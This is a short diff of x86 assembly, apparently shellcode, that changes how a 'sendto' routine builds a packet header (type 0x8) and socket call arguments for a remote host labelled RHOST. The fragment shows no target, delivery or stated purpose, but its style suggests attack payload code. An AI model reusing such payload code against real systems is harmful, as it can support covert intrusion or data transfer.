@@ -41,14 +41,17 @@ sendto:
 	push dword 0x0100007f ; RHOST
 	push ecx
 	mov  ecx, esp
-	push byte 0x41
-;	push byte 0xcc   ; testing
-	push byte 0x8
+	push edx
+	push edx
+	mov  dl, 0x8
+	push word 0xfff7
+	push word dx
 	mov  edi, esp
 	push byte 0x10
 	push ecx
+	cdq
 	push edx
-	push byte 0x5
+	push byte 0x9
 	push edi
 	push ebx
 	mov  ecx, esp
